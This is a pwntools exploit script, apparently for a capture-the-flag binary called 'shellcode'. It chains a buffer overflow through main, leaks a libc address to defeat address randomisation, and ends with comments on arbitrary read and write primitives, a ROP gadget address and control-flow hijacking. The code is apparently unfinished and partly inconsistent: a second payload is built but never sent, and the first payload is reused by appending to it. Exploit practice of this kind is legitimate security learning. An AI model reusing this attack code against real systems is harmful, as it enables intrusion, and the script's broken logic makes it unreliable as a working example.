from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./shellcode")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
env = {"LD_PRELOAD": "libc-2.23.so"}


#p = remote("ip", 4444)
#p = process("./shellcode")
p = gdb.debug("./shellcode", '''break *main
break *main+270
break *main+21
break *printf_positional+6987
break *0x4004a9
''')

bss = 0x0000000000601050
main = elf.sym["main"]
puts_got = elf.got["puts"]


payload = b""

payload += p64(bss) * 9
payload += p64(main)
p.sendlineafter(b"here>: \n", payload)

payload2 = b""
payload2 += b"%24$k"   # libc base


# Grab the leak
leak = u64(p.recv(6) + b"\x00\x00")
libc.address = leak - libc.sym["puts"]
print("Memory leak: ", hex(leak))
log.success(f"libc: {hex(libc.address)}")
print("puts GOT: ", hex(puts_got))

payload += p64(bss) * 9
payload += p64(0x400616)
p.sendlineafter(b"here>: \n", payload)


p.interactive()


# Primitives:
#   Arbitrary Read Leak Confirmed
#   Arbitrary Overwrite Confirmed
#   %4$k(%p)        = 4th argument is Heap memory with RW
#   %4195497x(%c)   = Adjust value in heap memory address (%4$p) (ROP address: 0x4004a9)
#   %4$m(%n)        = Write to 4th argument heap memory address
# payload += b"%4$k" + b"%4195497x" + b"%4$m"


# Flow can be hijacked if RSP is writable or if on the stack at a lower address.




